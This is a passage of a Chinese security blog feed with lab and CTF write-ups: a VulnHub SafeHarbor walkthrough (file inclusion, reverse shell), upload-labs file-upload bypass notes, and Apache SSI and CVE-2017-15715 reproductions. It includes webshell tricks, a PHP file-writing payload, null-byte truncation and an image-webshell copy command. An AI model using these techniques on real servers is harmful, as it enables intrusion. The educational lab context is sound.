class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pxy @ LAPTOP-UBIEP4K5</span></span><br><span class="line">$ xxd monster.jpg file.dump</span><br><span class="line"></span><br><span class="line"><span class="comment"># pxy @ LAPTOP-UBIEP4K5</span></span><br><span class="line">$ head -n 4 file.dump </span><br><span class="line">00000000: ffd8 ffe0 0010 4a46 4946 0001 0100 0001  ......JFIF......</span><br><span class="line">00000010: 0001 0000 ffdb 0043 0008 0606 0706 0508  .......C........</span><br><span class="line">00000020: 0707 0709 0908 0a0c 140d 0c0b 0b0c 1912  ................</span><br><span class="line">00000030: 130f 141d 1a1f 1e1d 1a1c 1c20 242e 2720  ........... $.<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># pxy @ LAPTOP-UBIEP4K5 </span></span><br><span class="line"><span class="string">$ xxd -r file.dump &gt; a.jpg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># pxy @ LAPTOP-UBIEP4K5 </span></span><br><span class="line"><span class="string">$ file a.jpg </span></span><br><span class="line"><span class="string">a.jpg: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 160x247, components 3</span></span><br></pre></td></tr></table></figure><p>这样比较方便，可以转成其他文件，进行编辑之后再转回来，本质上和vim一起用的效果一样</p><p>​        </p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxd </tag>
            
            <tag> hexdump </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>每天以一道leetcode-链表题</title>
      <link href="/posts/2e6a5f8a/"/>
      <url>/posts/2e6a5f8a/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>safeharbor靶机渗透</title>
      <link href="/posts/1f38a4f2/"/>
      <url>/posts/1f38a4f2/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>端口扫描：</p><p><img src= "/img/loading.gif" data-src="/posts/1f38a4f2/image-20200617201541147.png" alt></p><p>80端口运行了一个web，万能密码直接登陆</p><p>查看URL类似文件包含</p><p><img src= "/img/loading.gif" data-src="/posts/1f38a4f2/image-20200617201706478.png" alt></p><p>测试的时候发现包含文件的时候不需要加php，似乎有一个白名单的限制，因为包含 <code>/etc/passwd</code> 没有成功</p><p>包含了 <code>account.php</code> 找到了数据库的用户和密码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_null($_SESSION[<span class="string">"loggedin"</span>]))&#123;</span><br><span class="line">header(<span class="string">"Location: /"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$dbServer = mysqli_connect(<span class="string">'mysql'</span>,<span class="string">'root'</span>,<span class="string">'TestPass123!'</span>, <span class="string">'HarborBankUsers'</span>);</span><br><span class="line">$user = $_SESSION[<span class="string">"username"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'x'</span>])&#123;</span><br><span class="line">        $oldPass = mysqli_real_escape_string($dbServer, $_POST[<span class="string">'oldpass'</span>]);</span><br><span class="line">        $newPass = mysqli_real_escape_string($dbServer, $_POST[<span class="string">'newpass'</span>]);</span><br><span class="line">        $currentPassQueryResult = mysqli_query($dbServer, <span class="string">"SELECT password FROM users where username = '$user'"</span>);</span><br><span class="line">        $currentPassRow = mysqli_fetch_row($currentPassQueryResult);</span><br><span class="line">        $currentPass = $currentPassRow[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($oldPass == $currentPass)&#123;</span><br></pre></td></tr></table></figure><p>同时扫描目录探测到 <code>phpinfo页面</code> 发现可以远程包含</p><p><img src= "/img/loading.gif" data-src="/posts/1f38a4f2/c2VydmljZVR5cGU9MiZzZXJ2aWNlRGF0YT17Im5vdGVHdWlkIjoiNjkyZDhiZmEtMWFlZi00ZDBhLWE1NzYtY2YyNjU2Nzc5Y2U2IiwicmVzb3VyY0d1aWQiOiI5YzQ5YjFhOS05NDc1LTQ0NjItYmEyZS0wZWRjNWQ1ZjhkODUifQ==" alt></p><p>于是远程写一个php文件让其弹一个shell回来</p><p>为了方便就直接弹 <code>merterpreter</code> 吧</p><p>发现一个工具 <code>revshellgen</code> 可以方便地生成反弹shell的命令</p><p><img src= "/img/loading.gif" data-src="/posts/1f38a4f2/image-20200617202111215.png" alt></p><p>支持的种类还挺多的</p><p><img src= "/img/loading.gif" data-src="/posts/1f38a4f2/image-20200617202150512.png" alt></p><p>但是这里还是直接用msf反弹一个 <code>meterpreter</code> </p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
            <tag> vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>upload-lab做题笔记</title>
      <link href="/posts/5877398d/"/>
      <url>/posts/5877398d/</url>
      
        <content type="html"><![CDATA[<h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h2><p>这个算是逻辑漏洞了<br>reset 函数重置当前指针， end指向最后一个元素，这个最后并不是指最后的，而是最后加入数组的元素</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">php &gt; $a = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>);</span><br><span class="line">php &gt; current($a);</span><br><span class="line">php &gt; <span class="keyword">echo</span> current($a);</span><br><span class="line"><span class="number">1</span></span><br><span class="line">php &gt; <span class="keyword">echo</span> next($a);</span><br><span class="line"><span class="number">2</span></span><br><span class="line">php &gt; <span class="keyword">echo</span> current($a);</span><br><span class="line"><span class="number">2</span></span><br><span class="line">php &gt; <span class="keyword">echo</span> end($a);</span><br><span class="line"><span class="number">5</span></span><br><span class="line">php &gt; <span class="keyword">echo</span> current($a);</span><br><span class="line"><span class="number">5</span></span><br><span class="line">php &gt; <span class="keyword">echo</span> reset($a);</span><br><span class="line"><span class="number">1</span></span><br><span class="line">php &gt; <span class="keyword">echo</span> current($a);</span><br></pre></td></tr></table></figure><p>于是这样就可以理解了</p><p><img src= "/img/loading.gif" data-src="/posts/5877398d/1580398124587.png" alt></p><p>关键就在于用户可以控制这个文件名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$file = <span class="keyword">empty</span>($_POST[<span class="string">'save_name'</span>]) ? $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>] : $_POST[<span class="string">'save_name'</span>];</span><br><span class="line"><span class="keyword">if</span> (!is_array($file)) &#123;</span><br><span class="line">    $file = explode(<span class="string">'.'</span>, strtolower($file));</span><br><span class="line">&#125;</span><br><span class="line">var_dump($file);</span><br><span class="line">$ext = end($file);</span><br><span class="line">var_dump($ext);</span><br><span class="line">$allow_suffix = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line"><span class="keyword">if</span> (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">    $msg = <span class="string">"禁止上传该后缀文件!"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $file_name = reset($file) . <span class="string">'.'</span> . $file[count($file) - <span class="number">1</span>];</span><br><span class="line">    $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">    $img_path = UPLOAD_PATH . <span class="string">'/'</span> .$file_name;</span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">        $msg = <span class="string">"文件上传成功！"</span>;</span><br><span class="line">        $is_upload = <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br></pre></td></tr></table></figure><p>同时也要熟悉文件上传的数据包，复习了一遍 POST 方式传递数组同时可以规定元素的顺序</p><h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h2><p>CVE-2015-2348 利用即可（<strong>漏洞影响版本：PHP 5.4.38~5.6.6</strong>）</p><blockquote><p>move_uploaded_file ( string $filename , string ​$destination )</p></blockquote><p> 这次的漏洞就出现在参数$destination,这个参数的是将用户上传的文件移动到最终的目的地址。如果$destionation变量是从用户$_GET或者$_POST中获取的并且我们可控，那么我们就可以利用空字符\00来截断后面的拓展名，从而造成任意文件上传</p><p><img src= "/img/loading.gif" data-src="/posts/5877398d/1580398163615.png" alt></p><h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h2><p>这一关代码很多，最后没想到是通过条件竞争来达到目的</p><p>但是由于限制了后缀名，参考了很多博客都是利用 apache 解析漏洞</p><p><img src= "/img/loading.gif" data-src="/posts/5877398d/1580564170919.png" alt></p><h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h2><p>也是一个条件竞争的，关键代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">         $img_path = UPLOAD_PATH . <span class="string">'/'</span>. rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line">         rename($upload_file, $img_path);</span><br><span class="line">         $is_upload = <span class="keyword">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $msg = <span class="string">"只允许上传.jpg|.png|.gif类型文件！"</span>;</span><br><span class="line">        unlink($upload_file);</span><br></pre></td></tr></table></figure><p>我们上传一个 <code>shell.php</code><br>内容为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> file_put_contents(<span class="string">"info.php"</span>, <span class="string">"&lt;?php phpinfo(); ?&gt;"</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>之后去访问这个文件，就能生成 info.php</p><p><img src= "/img/loading.gif" data-src="/posts/5877398d/1580564183356.png" alt></p><p>还有一种方式先上传 <code>shell.php:.jpg</code> 绕过限制</p><p><img src= "/img/loading.gif" data-src="/posts/5877398d/1580564192098.png" alt></p><p>这样会生成 <code>shell.php</code> 的空文件，然后利用Windows的特性,尽管上传的文件被删除了，但是依旧覆盖了原有的文件</p><p><img src= "/img/loading.gif" data-src="/posts/5877398d/1580564202994.png" alt></p><h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h2><p>这题原来是有bug的，不过现在修改了</p><p>原来的代码：</p><p><img src= "/img/loading.gif" data-src="/posts/5877398d/20180829084054-2fdf5136-ab24-1.png" alt></p><p>可以很明显的看到，就算不是gif图片，也能够上传。</p><p><a href="https://xz.aliyun.com/t/2657#toc-0" target="_blank" rel="noopener">参考</a>这篇文章，这题涉及到了二次渲染的绕过问题</p><p>文章中给出的图片：<a href="https://github.com/Yang1k/upload-labs-Pass16" target="_blank" rel="noopener">链接</a></p><p>这样，在上传之后才能够保证二次渲染之后还是有马</p><p><img src= "/img/loading.gif" data-src="/posts/5877398d/11.gif" alt></p><h2 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h2><p><code>exif_imagetype</code> 检测是否为图片</p><p>制作图片马，然后上传即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy normal.jpg &#x2F;b + shell.php &#x2F;a webshell.jpg</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    <span class="comment">//需要开启php_exif模块</span></span><br><span class="line">    $image_type = exif_imagetype($filename);</span><br><span class="line">    <span class="keyword">switch</span> ($image_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_GIF:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_JPEG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> IMAGETYPE_PNG:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;    </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h2><p>上传图片马即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $types = <span class="string">'.jpeg|.png|.gif'</span>;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($filename))&#123;</span><br><span class="line">        $info = getimagesize($filename);</span><br><span class="line">        $ext = image_type_to_extension($info[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(stripos($types,$ext)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> $ext;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h2><p>判断了文件头，上传图片马即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span><span class="params">($filename)</span></span>&#123;</span><br><span class="line">    $file = fopen($filename, <span class="string">"rb"</span>);</span><br><span class="line">    $bin = fread($file, <span class="number">2</span>); <span class="comment">//只读2字节</span></span><br><span class="line">    fclose($file);</span><br><span class="line">    $strInfo = @unpack(<span class="string">"C2chars"</span>, $bin);    </span><br><span class="line">    $typeCode = intval($strInfo[<span class="string">'chars1'</span>].$strInfo[<span class="string">'chars2'</span>]);    </span><br><span class="line">    $fileType = <span class="string">''</span>;    </span><br><span class="line">    <span class="keyword">switch</span>($typeCode)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            $fileType = <span class="string">'jpg'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            $fileType = <span class="string">'png'</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            $fileType = <span class="string">'gif'</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            $fileType = <span class="string">'unknown'</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> $fileType;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h2><p>利用 <code>CVE-2015-2348</code> ， <code>move_uploaded_file</code> 函数遇到00会截断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_POST[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">"上传失败"</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p><code>move_uploaded_file</code> 遇到00会截断</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $ext_arr = <span class="keyword">array</span>(<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>);</span><br><span class="line">    $file_ext = substr($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],strrpos($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>],<span class="string">"."</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">        $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">        $img_path = $_GET[<span class="string">'save_path'</span>].<span class="string">"/"</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">"YmdHis"</span>).<span class="string">"."</span>.$file_ext;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file($temp_file,$img_path))&#123;</span><br><span class="line">            $is_upload = <span class="keyword">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php常用函数</title>
      <link href="/posts/3d16ce36/"/>
      <url>/posts/3d16ce36/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞复现-Apache SSI远程命令执行</title>
      <link href="/posts/becfc22d/"/>
      <url>/posts/becfc22d/</url>
      
        <content type="html"><![CDATA[<h2 id="SSI远程命令执行"><a href="#SSI远程命令执行" class="headerlink" title="SSI远程命令执行"></a>SSI远程命令执行</h2><p>当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用 <code>&lt;!--#exec cmd=”id” --&gt;</code> 语法执行命令。</p><blockquote><p>shtml 不是 html 而是一种服务器 API,shtml 是服务器动态产生的 htm<br>使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。</p></blockquote><p><img src= "/img/loading.gif" data-src="/posts/becfc22d/1580369820917.png" alt></p><p>上传之后，点击即可</p><p><img src= "/img/loading.gif" data-src="/posts/becfc22d/1580369831464.png" alt></p><p>可以尝试上传 shtml 文件来达到getshell的目的</p><p><img src= "/img/loading.gif" data-src="/posts/becfc22d/1580369842405.png" alt></p><h2 id="CVE-2017-15715-换行符截断"><a href="#CVE-2017-15715-换行符截断" class="headerlink" title="CVE-2017-15715 换行符截断"></a>CVE-2017-15715 换行符截断</h2><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A<br>将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p><p>发送文件上传数据包</p><p><img src= "/img/loading.gif" data-src="/posts/becfc22d/1580371055451.png" alt></p><p>需要添加一个 <code>\x0a</code></p><p><img src= "/img/loading.gif" data-src="/posts/becfc22d/1580371064625.png" alt></p><p>上传后解析成功</p><p><img src= "/img/loading.gif" data-src="/posts/becfc22d/1580371072709.png" alt></p><p>ps:也不知道如何构造文件上传数据包，我是写了一个表单来完成的,然后将相关的参数做一些修改即可</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://192.168.99.100:8080/index.php"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"file"</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> <span class="attr">id</span>=<span class="string">"file"</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">name</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>环境中处理文件上传的代码:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_FILES[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    $name = basename($_POST[<span class="string">'name'</span>]);</span><br><span class="line">    $ext = pathinfo($name,PATHINFO_EXTENSION);</span><br><span class="line">    <span class="keyword">if</span>(in_array($ext, [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>])) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">'bad file'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], <span class="string">'./'</span> . $name);</span><br></pre></td></tr></table></figure><h2 id="CVE-2015-2348-php任意文件上传"><a href="#CVE-2015-2348-php任意文件上传" class="headerlink" title="CVE-2015-2348 php任意文件上传"></a>CVE-2015-2348 php任意文件上传</h2><p>漏洞影响版本必须在5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7，详见CVE公告：<a href="https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348" target="_blank" rel="noopener">https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2015-2348</a><br>这个漏洞的利用条件比较苛刻，尝试用 php5.5.9 nts 测试没有成功<br>并且测试的时候发现</p><p><img src= "/img/loading.gif" data-src="/posts/becfc22d/1580397902588.png" alt></p><p>尽管加上了 \x00 但是实际上通过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$uploaded_name = $_FILES[ <span class="string">'uploaded'</span> ][ <span class="string">'name'</span> ];</span><br><span class="line">var_dump($uploaded_name);</span><br></pre></td></tr></table></figure><p>获取到的文件名并不会包含 <code>.jpg</code><br>这里就涉及到数据的获取问题了</p><p>文件上传的数据包可以分成这几个部分：</p><p><img src= "/img/loading.gif" data-src="/posts/becfc22d/1580397931674.png" alt></p><p>第一部分是会存储到 <code>$_FILES</code> 数字中，并且 <code>name</code> 是用来和后端交互的， <code>filename</code> 是固定的一个名字，后端通过 <code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code> 来得到<br>第二部分的数据是存储到 <code>$_POST</code> 和 <code>$_REQUEST</code> 数组中的</p><p><img src= "/img/loading.gif" data-src="/posts/becfc22d/1580397942131.png" alt></p><p>既然如此，那我就直接写死 <code>$target_path .= &quot;aaa.php\x00.jpg&quot;;</code> 即可进行测试</p><p> php 5.2.17 可以</p><p><img src= 